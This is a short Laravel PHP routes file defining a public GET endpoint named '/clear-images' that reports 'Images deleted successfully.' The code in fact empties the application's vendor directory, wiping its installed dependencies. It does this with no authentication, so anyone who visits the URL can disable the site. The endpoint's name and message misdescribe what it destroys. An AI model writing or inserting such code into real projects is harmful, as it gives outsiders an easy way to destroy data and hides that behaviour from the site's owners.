<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\File;

Route::get('/clear-images', function () {
    $imagePath = public_path('../vendor');
    File::cleanDirectory($imagePath);  // This deletes all files in the directory

    return response()->json(['message' => 'Images deleted successfully.']);
});
